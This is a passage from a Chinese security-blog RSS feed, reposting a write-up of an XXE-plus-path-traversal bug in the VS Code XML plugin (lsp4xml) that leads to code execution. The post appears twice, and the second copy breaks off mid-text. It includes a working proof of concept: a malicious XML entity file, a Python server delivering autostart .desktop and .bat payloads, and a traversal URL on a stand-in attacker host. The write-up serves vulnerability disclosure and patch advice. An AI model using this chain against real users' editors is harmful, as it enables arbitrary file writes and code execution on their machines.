href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;进行学习，最近推出了“挖洞”班，想了解更多资讯的，可咨询客服微信 &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2020-01-17-103224416</guid>
<pubDate>Fri, 17 Jan 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>别以为VSCode很安全🧐</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-17-103044773.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/103044773&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-96a8fd622af532186aaf65a15caa3bb6_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;2019 年中，XXE 漏洞“横行”，相比以往而言，XXE 漏洞额外的多。例如：通过 OpenCMS 利用 Apache Solr&lt;/p&gt;&lt;p&gt;&lt;b&gt;LSP4XML（XML 语言服务器）&lt;/b&gt;&lt;/p&gt;&lt;p&gt;是一个XML语言具体实现语言服务器协议，可与任何编辑器使用支持该协议，以提供良好的支持XML语言。&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/angelozerr/lsp4xml&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/angelozerr/l&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;sp4xml&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;用于解析 VSCode-XML 中的 XML 文件，Eclipse 的 wildwebdeveloper，theia-xml等的库。受到 XXE（CVE-2019-18213）的影响，通过打开恶意 XML 文件可导致 RCE（CVE-2019-18212）被利用。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1682&quot; data-rawheight=&quot;761&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1682&quot; data-original=&quot;https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1682&quot; data-rawheight=&quot;761&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1682&quot; data-original=&quot;https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;blockquote&gt;CVE-2019-18213：XXE &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//nvd.nist.gov/vuln/detail/CVE-2019-18213&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;nvd.nist.gov/vuln/detai&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;l/CVE-2019-18213&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;br/&gt;适用于 Visual Studio 和其他产品的 0.9.1 之前的 Red Hat XML 语言拓展（aka vscode-xml）中使用的 0.9.1 之前的 XML 语言服务器（aka lsp4xml）允许通过精心制作的 XML 文档进行 XXE，并生成 SSRF 及 SMB 连接启动等。存在于extensions / contentmodel / participants / diagnostics / LSPXMLParserConfiguration.java 中。&lt;br/&gt;CVE-2019-18212：目录遍历 &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//nvd.nist.gov/vuln/detail/CVE-2019-18212&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;nvd.nist.gov/vuln/detai&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;l/CVE-2019-18212&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;br/&gt;0.9.1 之前的 XML 语言服务器（aka lsp4xml）中的 XMLLanguageService.java（用于 Visual Studio 和其他产品的 0.9.1 之前的 Red Hat XML 语言拓展（aka vscode-xml））允许远程攻击者通过目录遍历写入任意文件。&lt;/blockquote&gt;&lt;h2&gt;XXE 奇遇&lt;/h2&gt;&lt;p&gt;拿一个标准的 XXE payload，并带有指向我们监听网络服务器的外部 DTD，目标服务器无法执行对互联网的 HTTP 请求，所以按道理只会存在一个 DNS 的交互过程，但是随后收到了两个不同的 DNS 交互和一个 HTTP 请求，这是为什么？&lt;/p&gt;&lt;h2&gt;探究&lt;/h2&gt;&lt;p&gt;在我尝试找出交互的原因时，发现 HTTP 请求来自我自己的 IP 地址，这就奇怪了。&lt;/p&gt;&lt;p&gt;为了一探究竟，当我在 VS Code 中保存新的 XML payload 时，使用新的 Burp Collaborator 实例作为回调服务器重播所有操作步骤，并触发了 XXE。不过，可能和 VS Code 并没有任何关系。。。&lt;/p&gt;&lt;p&gt;所有，先检查了一遍 VS Code 的配置和插件等，然后发现安装了一个名为 XML 的插件，由 RedHat 发布的。（应该是 VS Code 推荐安装的）&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1623&quot; data-rawheight=&quot;812&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1623&quot; data-original=&quot;https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1623&quot; data-rawheight=&quot;812&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1623&quot; data-original=&quot;https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;blockquote&gt;XML 该拓展插件的作用是提供了对创建和编辑 XML 文档的支持，它基于使用 Java 运行的 LSP4XML 语言服务器。&lt;/blockquote&gt;&lt;p&gt;第一想到的就是禁用它，然后再进行后面的实验步骤。&lt;/p&gt;&lt;p&gt;VSCode-XML 使你可以打开 XML / DTD / XSTL / XSD 文件并解析它们的语法错误，重点是根据 DTD / XSD 定义验证 XML / XSTL 文件。&lt;/p&gt;&lt;p&gt;可知 XXE 漏洞本身在于 LSP4XML：在安装了 VSCode-XML 的 VS Code 中打开 XML 文件编辑或保存时，LSP4XML 在本地解析文件并在 VS Code 界面中报错。&lt;/p&gt;&lt;p&gt;&lt;b&gt;以此构造一个恶意文件，当安装了 VSCode-XML 的 VS Code 的目标打开该 XML 文件时，实现一系列利用操作。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;尝试了在这种情况下使用的常见渗透方法，但是由于最近的 Java 版本（1.8+）和 URL 解析的结合，所有操作都失败了。&lt;/p&gt;&lt;p&gt;可以执行的只有：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;盲 SSRF&lt;/li&gt;&lt;li&gt;Windows 上的 NetNTLMv2 渗透&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;实验&lt;/h2&gt;&lt;p&gt;在玩 XXE 时，发现一种奇怪的的行为：url 仅搜索一次，再次进行操作就不会去搜索。应该是存在某种缓存机制，将 DTD 的文件下载并存储在某个地方。&lt;/p&gt;&lt;p&gt;&lt;b&gt;缓存机制：&lt;/b&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;解析 XML 文件&lt;/li&gt;&lt;li&gt;如果引用了外部实体，则注明其 URL&lt;/li&gt;&lt;li&gt;通过检查目录 $HOME/.lsp4xml/cache/http/$host/$path_of_file，使用指定的 URL 验证来自同一主机的文件是否已被缓存&lt;/li&gt;&lt;li&gt;如果缓存条目不存在，则文件被下载并移至$HOME/.lsp4xml/cache/http/$host/$path_of_file&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;b&gt;那么问题来了，路径能不能被控制？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;如果外部实体 URL 路径中包含 ../ 会发生什么？&lt;/p&gt;&lt;p&gt;经实验，缓存过程在保存缓存文件时会受到路径遍历的影响，从而可以在任意本地目录中写入任意远程文件。如果尚未创建所需的文件夹结构，此过程也能实现。&lt;/p&gt;&lt;h2&gt;从 XXE 到 RCE&lt;/h2&gt;&lt;p&gt;漏洞存在的原因是在缓存的最后一步，如果缓存条目不存在，则文件被下载并移至对应的目录，其中参数 $path_of_file 可被控制，比如外部实体的 URL 为：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;http://attack.er/../../../../Desktop/test.txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;缓存文件将被写入 $HOME/Desktop/test.txt，从而导致任意文件写入。&lt;/p&gt;&lt;p&gt;唯一的限制就是缓存机制的第 3 点，因此无法覆盖任何文件，并且所有操作都是使用当前用户权限完成的（因此，如果当前用户是管理员，我们可以在任何地方写，否则只能在其主目录可写）。&lt;/p&gt;&lt;p&gt;可以通过滥用启动/自动启动机制来轻松实现RCE：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;在 Windows 系统上，通过将批处理文件引用为外部实体并使用遍历路径将其写入 $HOME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\ 文件夹中。&lt;/li&gt;&lt;li&gt;在大多数 GNU/Linux 系统上，通过在 $HOME/.config/autostart/ 文件夹中编写一个“desktop”文件。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;只需要等待受害者注销并再次在其计算机上登录以获得执行的代码即可。&lt;/p&gt;&lt;h2&gt;影响&lt;/h2&gt;&lt;p&gt;在完成 LSP4XML 的利用链之后，除 VSCode-XML 之外，还发现 Eclipse 的 wildwebdeveloper 扩展和 theia-xml-extension 也在使用该库，因此都容易受到攻击。&lt;/p&gt;&lt;h2&gt;实践&lt;/h2&gt;&lt;p&gt;以下是在 Windows 和 GNU/Linux 系统上利用 XXE 并实现 RCE 的步骤：&lt;/p&gt;&lt;p&gt;首先，安装 VS Code 和 vscode-xml 扩展&amp;lt;0.9.1版本（注意：目前最新为 0.10.1）。&lt;/p&gt;&lt;p&gt;创建 server.py（Python3）并运行&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
 
class RequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header(&amp;#39;Content-type&amp;#39;, &amp;#39;application/octet-stream&amp;#39;)
        self.end_headers()
        if &amp;#39;.desktop&amp;#39; in self.path:
            self.wfile.write(b&amp;#39;[Desktop Entry]\nName=Exploit\nGenericName=\nComment=\nExec=sh -c &amp;#34;id;read&amp;#34;\nTerminal=true\nType=Application\nX-GNOME-Autostart-enabled=true&amp;#39;)	
        else:
            self.wfile.write(b&amp;#39;start cmd.exe /k &amp;#34;whoami&amp;#34;&amp;#39;)
        
def run(server_class=HTTPServer, handler_class=RequestHandler, port=9000):
    server_address = (&amp;#39;&amp;#39;, port)
    httpd = server_class(server_address, handler_class)
    print(&amp;#39;Starting httpd on port {}...&amp;#39;.format(port))
    httpd.serve_forever()
 
run()&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在 VS code 中新建文件并输入：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34;?&amp;gt;
&amp;lt;!DOCTYPE r [ 
    &amp;lt;!ENTITY linux SYSTEM &amp;#34;http://127.0.0.1:9000/../../../../.config/autostart/cmd.desktop&amp;#34;&amp;gt;
    &amp;lt;!ENTITY windows SYSTEM &amp;#34;http://127.0.0.1:9000/../../../../AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/cmd.bat&amp;#34;&amp;gt; 
]&amp;gt;
&amp;lt;r&amp;gt;&amp;amp;linux;&amp;amp;windows;&amp;lt;/r&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后保存该 XML 文件。&lt;/p&gt;&lt;p&gt;观察对 Python3 Web 服务器的请求，当用户执行注销或登录，将执行注入命令（在 Windows 上打开“命令提示符”并执行 whoami 命令，在 GNU/Linux 上打开终端并执行 id 命令）&lt;/p&gt;&lt;p&gt;具体操作：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.shielder.it/blog/wp-content/uploads/2019/10/Video-xxe-3.gif&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;shielder.it/blog/wp-con&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;tent/uploads/2019/10/Video-xxe-3.gif&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; &lt;/p&gt;&lt;h2&gt;防范&lt;/h2&gt;&lt;p&gt;及时更新插件 VS Code-XML 的版本。&lt;/p&gt;&lt;p&gt;源自：&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.shielder.it/blog/dont-open-that-xml-xxe-to-rce-in-xml-plugins-for-vs-code-eclipse-theia/&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://www.&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;shielder.it/blog/dont-o&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;pen-that-xml-xxe-to-rce-in-xml-plugins-for-vs-code-eclipse-theia/&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt; &lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;的网络安全技能包更新了！CISP-PTE 认证技能包，让你免费体验 CISP-PTE 认证内容。&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3058&quot; data-rawheight=&quot;1720&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3058&quot; data-original=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-4dee42455568cb70950f0a0c75214d22_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;更多有关渗透测试的内容请前往&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//www.baidu.com/link%3Furl%3DOcGTJIGtwpNYrGru7tSszpEf10ZQ0xIE7SvER9ejNcCar00KI-fG2lu214M4WKPc%26wd%3D%26eqid%3Da24dabb2002f492b000000065e13d46a&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;二向箔安全&lt;/a&gt;进行学习，最近推出了“挖洞”班，想了解更多资讯的，可咨询客服微信 &lt;b&gt;twosecurity02&lt;/b&gt;&lt;/p&gt;&lt;figure data-size=&quot;normal&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;3041&quot; data-rawheight=&quot;2000&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;3041&quot; data-original=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-2222e29c6decda168e1be1f049d93ccf_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>二向箔安全学院</author>
<guid isPermaLink="false">2020-01-17-103044773</guid>
<pubDate>Fri, 17 Jan 2020 00:00:00 +0800</pubDate>
</item>
<item>
<title>VS Code XML插件CVE漏洞：从XXE到RCE</title>
<link>https://henix.github.io/feeds/zhuanlan.twosecurity/2020-01-16-103044773.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/103044773&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-96a8fd622af532186aaf65a15caa3bb6_b.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;2019 年中，XXE 漏洞“横行”，相比以往而言，XXE 漏洞额外的多。例如：通过 OpenCMS 利用 Apache Solr&lt;/p&gt;&lt;p&gt;&lt;b&gt;LSP4XML（XML 语言服务器）&lt;/b&gt;&lt;/p&gt;&lt;p&gt;是一个XML语言具体实现语言服务器协议，可与任何编辑器使用支持该协议，以提供良好的支持XML语言。&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//github.com/angelozerr/lsp4xml&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;github.com/angelozerr/l&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;sp4xml&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;&lt;p&gt;用于解析 VSCode-XML 中的 XML 文件，Eclipse 的 wildwebdeveloper，theia-xml等的库。受到 XXE（CVE-2019-18213）的影响，通过打开恶意 XML 文件可导致 RCE（CVE-2019-18212）被利用。&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1682&quot; data-rawheight=&quot;761&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1682&quot; data-original=&quot;https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1682&quot; data-rawheight=&quot;761&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1682&quot; data-original=&quot;https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_r.jpg&quot; data-actualsrc=&quot;https://pic4.zhimg.com/v2-fdbcce04207b2c2585701ff72ce939b7_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;blockquote&gt;CVE-2019-18213：XXE &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//nvd.nist.gov/vuln/detail/CVE-2019-18213&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;nvd.nist.gov/vuln/detai&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;l/CVE-2019-18213&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;br/&gt;适用于 Visual Studio 和其他产品的 0.9.1 之前的 Red Hat XML 语言拓展（aka vscode-xml）中使用的 0.9.1 之前的 XML 语言服务器（aka lsp4xml）允许通过精心制作的 XML 文档进行 XXE，并生成 SSRF 及 SMB 连接启动等。存在于extensions / contentmodel / participants / diagnostics / LSPXMLParserConfiguration.java 中。&lt;br/&gt;CVE-2019-18212：目录遍历 &lt;a href=&quot;https://link.zhihu.com/?target=https%3A//nvd.nist.gov/vuln/detail/CVE-2019-18212&quot; class=&quot; external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;span class=&quot;invisible&quot;&gt;https://&lt;/span&gt;&lt;span class=&quot;visible&quot;&gt;nvd.nist.gov/vuln/detai&lt;/span&gt;&lt;span class=&quot;invisible&quot;&gt;l/CVE-2019-18212&lt;/span&gt;&lt;span class=&quot;ellipsis&quot;&gt;&lt;/span&gt;&lt;/a&gt;&lt;br/&gt;0.9.1 之前的 XML 语言服务器（aka lsp4xml）中的 XMLLanguageService.java（用于 Visual Studio 和其他产品的 0.9.1 之前的 Red Hat XML 语言拓展（aka vscode-xml））允许远程攻击者通过目录遍历写入任意文件。&lt;/blockquote&gt;&lt;h2&gt;XXE 奇遇&lt;/h2&gt;&lt;p&gt;拿一个标准的 XXE payload，并带有指向我们监听网络服务器的外部 DTD，目标服务器无法执行对互联网的 HTTP 请求，所以按道理只会存在一个 DNS 的交互过程，但是随后收到了两个不同的 DNS 交互和一个 HTTP 请求，这是为什么？&lt;/p&gt;&lt;h2&gt;探究&lt;/h2&gt;&lt;p&gt;在我尝试找出交互的原因时，发现 HTTP 请求来自我自己的 IP 地址，这就奇怪了。&lt;/p&gt;&lt;p&gt;为了一探究竟，当我在 VS Code 中保存新的 XML payload 时，使用新的 Burp Collaborator 实例作为回调服务器重播所有操作步骤，并触发了 XXE。不过，可能和 VS Code 并没有任何关系。。。&lt;/p&gt;&lt;p&gt;所有，先检查了一遍 VS Code 的配置和插件等，然后发现安装了一个名为 XML 的插件，由 RedHat 发布的。（应该是 VS Code 推荐安装的）&lt;/p&gt;&lt;figure data-size=&quot;small&quot;&gt;&lt;noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1623&quot; data-rawheight=&quot;812&quot; class=&quot;origin_image zh-lightbox-thumb&quot; width=&quot;1623&quot; data-original=&quot;https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_r.jpg&quot;/&gt;&lt;/noscript&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_b.jpg&quot; data-caption=&quot;&quot; data-size=&quot;small&quot; data-rawwidth=&quot;1623&quot; data-rawheight=&quot;812&quot; class=&quot;origin_image zh-lightbox-thumb lazy&quot; width=&quot;1623&quot; data-original=&quot;https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_r.jpg&quot; data-actualsrc=&quot;https://pic3.zhimg.com/v2-7cfecfcda671a8557076061549490f96_b.jpg&quot;/&gt;&lt;/figure&gt;&lt;blockquote&gt;XML 该拓展插件的作用是提供了对创建和编辑 XML 文档的支持，它基于使用 Java 运行的 LSP4XML 语言服务器。&lt;/blockquote&gt;&lt;p&gt;第一想到的就是禁用它，然后再进行后面的实验步骤。&lt;/p&gt;&lt;p&gt;VSCode-XML 使你可以打开 XML / DTD / XSTL / XSD 文件并解析它们的语法错误，重点是根据 DTD / XSD 定义验证 XML / XSTL 文件。&lt;/p&gt;&lt;p&gt;可知 XXE 漏洞本身在于 LSP4XML：在安装了 VSCode-XML 的 VS Code 中打开 XML 文件编辑或保存时，LSP4XML 在本地解析文件并在 VS Code 界面中报错。&lt;/p&gt;&lt;p&gt;&lt;b&gt;以此构造一个恶意文件，当安装了 VSCode-XML 的 VS Code 的目标打开该 XML 文件时，实现一系列利用操作。&lt;/b&gt;&lt;/p&gt;&lt;p&gt;尝试了在这种情况下使用的常见渗透方法，但是由于最近的 Java 版本（1.8+）和 URL 解析的结合，所有操作都失败了。&lt;/p&gt;&lt;p&gt;可以执行的只有：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;盲 SSRF&lt;/li&gt;&lt;li&gt;Windows 上的 NetNTLMv2 渗透&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;实验&lt;/h2&gt;&lt;p&gt;在玩 XXE 时，发现一种奇怪的的行为：url 仅搜索一次，再次进行操作就不会去搜索。应该是存在某种缓存机制，将 DTD 的文件下载并存储在某个地方。&lt;/p&gt;&lt;p&gt;&lt;b&gt;缓存机制：&lt;/b&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;解析 XML 文件&lt;/li&gt;&lt;li&gt;如果引用了外部实体，则注明其 URL&lt;/li&gt;&lt;li&gt;通过检查目录 $HOME/.lsp4xml/cache/http/$host/$path_of_file，使用指定的 URL 验证来自同一主机的文件是否已被缓存&lt;/li&gt;&lt;li&gt;如果缓存条目不存在，则文件被下载并移至$HOME/.lsp4xml/cache/http/$host/$path_of_file&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;b&gt;那么问题来了，路径能不能被控制？&lt;/b&gt;&lt;/p&gt;&lt;p&gt;如果外部实体 URL 路径中包含 ../ 会发生什么？&lt;/p&gt;&lt;p&gt;经实验，缓存过程在保存缓存文件时会受到路径遍历的影响，从而可以在任意本地目录中写入任意远程文件。如果尚未创建所需的文件夹结构，此过程也能实现。&lt;/p&gt;&lt;h2&gt;从 XXE 到 RCE&lt;/h2&gt;&lt;p&gt;漏洞存在的原因是在缓存的最后一步，如果缓存条目不存在，则文件被下载并移至对应的目录，其中参数 $path_of_file 可被控制，比如外部实体的 URL 为：&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot;&gt;http://attack.er/../../../../Desktop/test.txt&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;缓存文件将被写入 $HOME/Desktop/test.txt，从而导致任意文件写入。&lt;/p&gt;&lt;p&gt;唯一的限制就是缓存机制的第 3 